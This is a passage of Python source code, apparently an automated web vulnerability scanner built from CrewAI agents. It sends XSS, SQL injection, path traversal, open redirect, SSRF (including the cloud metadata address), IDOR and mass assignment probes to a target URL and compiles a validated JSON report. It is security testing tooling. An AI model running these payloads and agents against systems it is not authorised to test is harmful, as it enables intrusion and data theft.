- ALWAYS check if sanitization (DOMPurify) exists in the body
- DOM XSS payload should NOT be reflected by the server''',
    llm=llm_pro,
    tools=[fetch_site_data, active_payload_tester],
    allow_delegation=False,
    verbose=True
)

api_agent = Agent(
    role='API Security & Authentication Auditor',
    goal='Detect API-specific vulnerabilities on {target_url} including broken authentication, mass assignment, and information disclosure.',
    backstory='''You are an API security specialist following OWASP API Security Top 10. SPEED IS CRITICAL — test directly.
Your methodology:
Step 1 — API Endpoint Identification: From recon, identify endpoints with /api/, /v1/, /v2/, /rest/, /graphql. These are your primary targets.
Step 2 — Documentation Exposure: Use fetch_site_data to probe these paths directly:
  /swagger.json, /openapi.json, /api-docs, /swagger/index.html, /graphql
  If status 200 with API spec content in body = MEDIUM severity info disclosure
Step 3 — Broken Authentication Test: Use active_payload_tester directly:
  Test 1: Send GET to API endpoints with parameter="test", payload="test" → if 200 with data in body_snippet = BROKEN AUTH
  Test 2: Send with parameter="Authorization", payload="Bearer invalid_token_12345" → if 200 = token not validated
  401/403 = auth is WORKING correctly (not a vulnerability)
Step 4 — HTTP Method Tampering: Test unexpected methods:
  Use active_payload_tester with method="DELETE" on read-only endpoints → if 200 = method not restricted
  Use method="PUT" on GET endpoints → if 200 = method not restricted
Step 5 — Mass Assignment: For POST endpoints, use active_payload_tester:
  Send parameter="role" with payload="admin" → check body_snippet for "admin" reflected = mass assignment
  Send parameter="isAdmin" with payload="true" → check body_snippet
Step 6 — IDOR Test: If endpoints have numeric IDs, try adjacent IDs:
  /api/user/1 → /api/user/2 → if different user data returned = IDOR

FALLBACK ONLY: If you find promising API endpoints but need deeper parameter discovery, use arjun_param_discovery.

CRITICAL RULES:
- Start with active_payload_tester and fetch_site_data for SPEED — do NOT call arjun first
- 401/403 = auth is WORKING (not a vuln)
- Public data endpoints are NOT vulnerabilities
- Finding an API endpoint alone is NOT a vulnerability''',
    llm=llm_pro,
    tools=[active_payload_tester, fetch_site_data, arjun_param_discovery],
    allow_delegation=False,
    verbose=True
)

validator_agent = Agent(
    role='Lead Security QA & Reporting Auditor',
    goal='Cross-validate ALL findings from attack agents, eliminate false positives, and produce a clean JSON vulnerability report for {target_url}.',
    backstory='''You are the final quality gate. Your job is to filter raw findings into verified vulnerabilities.
Do NOT run any tools — just analyze the evidence already provided by the attack agents.
Step 1 — Evidence Verification per type:
  XSS: REQUIRE payload appears UNENCODED in body_snippet in an executable context (not HTML-entity-encoded, not inside <!-- comment -->). DISCARD if encoded or no body_snippet evidence.
  SQLi: REQUIRE SQL error message in body_snippet (e.g. "SQL syntax", "mysql_fetch", "ORA-") OR time delay >=5s in "time" field OR SQLMap "is vulnerable". DISCARD if no concrete evidence.
  LFI: REQUIRE file content in body_snippet ("root:x:0:0", "[extensions]", "<web-app"). DISCARD if only 500 error without file content.
  Open Redirect: REQUIRE 3xx status + response_headers.Location pointing to external domain.
  SSRF: REQUIRE internal content in body_snippet that differs from baseline OR interactsh ssrf_confirmed=true OR varying content_length across internal IPs. DISCARD if URL just echoed back.
  DOM XSS: REQUIRE actual JavaScript code citation from page source showing source-to-sink flow AND reflected:false. DISCARD if agent guessed without citing code.
  API: REQUIRE 200 response with data for unauthenticated request, or mass assignment reflected. DISCARD if 401/403.
Step 2 — Severity Assignment:
  CRITICAL: SQLi with data extraction, LFI reading system files, SSRF with cloud metadata, Broken Auth with data access
  HIGH: Reflected XSS confirmed, Blind SQLi (time-based confirmed), SSRF with internal content, DOM XSS with cited code
  MEDIUM: Open Redirect with 3xx, API docs exposure, Boolean-based SQLi
  LOW: Verbose SQL errors without exploitation, Self-XSS, information disclosure
  DISCARD: Unconfirmed findings, potential issues without body_snippet evidence
Step 3 — Deduplicate — same vuln on same parameter = one entry.
Step 4 — Output ONLY a raw JSON array. No markdown, no backticks, no preamble.
Each object: {"type":"","name":"","severity":"Critical|High|Medium|Low","location":"","description":"","evidence":""}''',
    llm=llm_flash,
    tools=[],
    allow_delegation=False,
    verbose=True
)

# 4. Detailed Tasks

recon_task = Task(
    description='''Perform FAST reconnaissance on {target_url}:
1. Run load_crawl_data on {target_url} to get ALL pre-discovered endpoints, parameters, and forms from the deep crawler.
2. Run historical_urls on the domain to find deleted/hidden endpoints from archives.
3. Analyze technology stack from the crawl data headers (server, cookies, x-powered-by).
4. Quickly categorize every discovered parameter as HIGH/MEDIUM/LOW value for each vulnerability type.
Output a structured technical map listing every endpoint URL with its parameters. Be concise — just list the data, no lengthy analysis.''',
    expected_output="A structured attack surface map with endpoints, parameters, forms, technology stack, and vulnerability type recommendations.",
    agent=recon_specialist
)

xss_task = Task(
    description='''Test {target_url} for Cross-Site Scripting based on the recon report:
1. Read the recon data. For each endpoint with parameters, use active_payload_tester to send a canary string (e.g. "phoenix7x7") and check if it appears in body_snippet (reflection test).
2. For each reflecting parameter, read the body_snippet to determine the injection CONTEXT (HTML body, attribute, JavaScript, URL).
3. Generate context-appropriate XSS payloads and test each with active_payload_tester:
   - HTML: <svg onload=alert(1)>, <img src=x onerror=alert(1)>
   - Attribute: " onmouseover="alert(1), " autofocus onfocus="alert(1)
   - JavaScript: ';alert(1)//, </script><script>alert(1)</script>
4. Check body_snippet — CONFIRMED if the payload appears UNENCODED in an executable context.
5. If reflection exists but all payloads are encoded, try encoding bypasses.
6. ONLY if you cannot confirm after multiple attempts, use dalfox_xss_scan as fallback.
Document each confirmed XSS with: parameter, payload, injection context, and body_snippet evidence.''',
    expected_output="List of verified XSS vulnerabilities with parameter, payload, context, and body_snippet evidence.",
    agent=xss_agent,
    context=[recon_task]
)

sqli_task = Task(
    description='''Test {target_url} for SQL Injection based on the recon report:
1. From recon data, identify all endpoints with parameters (GET query params + POST form fields). Prioritize: search, login, id, user, category, sort, filter.
2. For EACH parameter, send a single quote (') via active_payload_tester and check body_snippet for SQL error messages ("SQL syntax", "mysql", "ORA-", "ODBC").
3. For promising parameters, test boolean-based:
   - Send "1' OR '1'='1" → record content_length
   - Send "1' OR '1'='2" → compare content_length. Different = boolean blind SQLi.
4. Test time-based: Send "1' AND SLEEP(5)-- -" → CONFIRMED if "time" field >= 5.0 seconds.
5. For POST login/search forms, use method="POST" with active_payload_tester.
6. ONLY if error-based detection confirms SQL errors but you need deeper proof, use sqlmap_scan as fallback.
Document each finding with: parameter, error message from body_snippet, time delay, or content_length difference.''',
    expected_output="List of verified SQLi vulnerabilities with error evidence from body_snippet, time delays, or boolean differences.",
    agent=sqli_agent,
    context=[recon_task]
)

lfi_task = Task(
    description='''Test {target_url} for LFI and Open Redirect based on the recon report:
1. From recon data, identify parameters suggesting file handling (page, file, doc, path, template, include, lang, view, content, cfile, filename).
2. For each file parameter, send path traversal payloads directly via active_payload_tester:
   - ../../../../etc/passwd → check body_snippet for "root:x:0:0:"
   - ../../../../WEB-INF/web.xml → check body_snippet for "<web-app" (Java targets)
   - ..\\..\\..\\..\\windows\\win.ini → check body_snippet for "[extensions]"
3. If 500 errors returned, try encoding bypasses: ....//....//etc/passwd, ..%2f..%2f..%2fetc%2fpasswd, ..%252f..%252f
4. For redirect parameters (url, redirect, next, dest, return, goto), test:
   - Send "https://evil.com" → check status for 3xx AND response_headers.Location
5. ONLY if direct testing is inconclusive, use ffuf_lfi_fuzz as fallback.
Document each finding with the payload and file contents from body_snippet as evidence.''',
    expected_output="List of verified LFI and Open Redirect vulnerabilities with file content from body_snippet or redirect Location evidence.",
    agent=lfi_agent,
    context=[recon_task]
)

ssrf_task = Task(
    description='''Test {target_url} for SSRF based on the recon report:
1. From recon data, identify parameters that accept URLs or hostnames (url, link, src, fetch, proxy, webhook, callback, preview, image_url, HostName, host).
2. First, establish a BASELINE: send a normal URL (e.g. "https://example.com") via active_payload_tester and record content_length.
3. Then test internal URLs directly via active_payload_tester:
   - http://127.0.0.1 → compare content_length with baseline. Different = server is fetching.
   - http://169.254.169.254/latest/meta-data/ → check body_snippet for AWS metadata (CRITICAL).
   - http://127.0.0.1:22, :3306, :6379 → compare content_length across ports.
4. CONFIRMED SSRF if body_snippet shows internal content OR content_length varies significantly per internal target.
5. NOT SSRF if the URL is just echoed back in the HTML ("reflected":true but body is same).
6. ONLY if you suspect blind SSRF (server fetches but doesn't return content), use interactsh_ssrf_test as fallback.''',
    expected_output="List of verified SSRF vulnerabilities with body_snippet evidence of internal content or content_length differences.",
    agent=ssrf_agent,
    context=[recon_task]
)

dom_xss_task = Task(
    description='''Analyze {target_url} for DOM-based XSS:
1. Use fetch_site_data on each page that has parameters (from recon) to get the HTML and JavaScript (returned in the "body" field).
2. Read the "body" field and search the JavaScript code for SOURCES: location.hash, location.search, document.URL, document.referrer, window.name.
3. Search for SINKS: innerHTML, document.write, eval(), setTimeout(string), jQuery .html().
4. If a source feeds directly into a sink without DOMPurify sanitization, cite the exact JavaScript code and construct a trigger URL.
5. Use active_payload_tester to test the trigger URL. If "reflected": false but the source-to-sink flow exists, it's DOM XSS.
6. You MUST cite the actual JavaScript code from the body. Do NOT guess or assume.''',
    expected_output="List of DOM XSS vulnerabilities with cited source code, source, sink, code flow, and trigger URL.",
    agent=dom_xss_agent,
    context=[recon_task]
)

api_task = Task(
    description='''Test {target_url} API endpoints for security issues:
1. From recon data, identify /api/, /v1/, /v2/, /rest/, /graphql endpoints.
2. Use fetch_site_data to probe /swagger.json, /openapi.json, /api-docs, /swagger/index.html for exposed documentation.
3. For each API endpoint, use active_payload_tester to test:
   - Auth bypass: Send request without auth → if 200 with data in body_snippet = BROKEN AUTH
   - Method tampering: Send DELETE/PUT to read-only endpoints → if 200 = not restricted
   - Mass assignment: Send parameter="role" payload="admin" via POST → check if reflected
4. ONLY if you need deeper hidden parameter discovery, use arjun_param_discovery as fallback.
Document findings with body_snippet evidence showing unauthorized data access or accepted parameters.''',
    expected_output="List of API vulnerabilities with body_snippet evidence: broken auth, exposed docs, method tampering.",
    agent=api_agent,
    context=[recon_task]
)

report_task = Task(
    description='''Review ALL findings from the attack agents. Do NOT run any tools.
1. For each finding, verify evidence exists (payload + server response). Discard findings without proof.
2. Assign severity: Critical (SQLi+data, SSRF+metadata, Broken Auth), High (Reflected XSS, Blind SQLi, DOM XSS), Medium (Open Redirect, API docs), Low (verbose errors).
3. Deduplicate — same vuln on same parameter = one entry.
4. Output ONLY a raw JSON array. No markdown, no backticks, no explanation.
Each object MUST have: "type", "name", "severity", "location", "description", "evidence".''',
    expected_output='A raw JSON array of verified vulnerabilities. Example: [{"type":"XSS","name":"Reflected XSS in search","severity":"High","location":"https://target.com/search?q=PAYLOAD","description":"...","evidence":"..."}]',
    agent=validator_agent,
    context=[xss_task, sqli_task, lfi_task, ssrf_task, dom_xss_task, api_task]
)

# 5. Main
def main():
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Target URL missing"}))
        return
    
    target = sys.argv[1]
    crew = Crew(
        agents=[recon_specialist, xss_agent, sqli_agent, lfi_agent, ssrf_agent, dom_xss_agent, api_agent, validator_agent],
        tasks=[recon_task, xss_task, sqli_task, lfi_task, ssrf_task, dom_xss_task, api_task, report_task],
        process=Process.sequential,
        verbose=True,
        max_rpm=30
    )

    try:
        original_stdout = sys.stdout
        sys.stdout = sys.stderr
        result = crew.kickoff(inputs={'target_url': target})
        res_str = str(result).strip()
        sys.stdout = original_stdout
        
        start = res_str.find('[')
        end = res_str.rfind(']')
        if start != -1 and end != -1:
            print("---JSON_START---")
            print(res_str[start:end+1])
            print("---JSON_END---")
        else:
            print("---JSON_START---")
            print(json.dumps([{"type": "Info", "name": "Scan Complete", "severity": "Info", "location": target, "description": res_str[:1000], "evidence": ""}]))
            print("---JSON_END---")
    except Exception as e:
        print("---JSON_START---")
        print(json.dumps([{"type": "Error", "name": "System Failure", "severity": "High", "location": target, "description": str(e), "evidence": "None"}]))
        print("---JSON_END---")

if __name__ == "__main__":
    main()
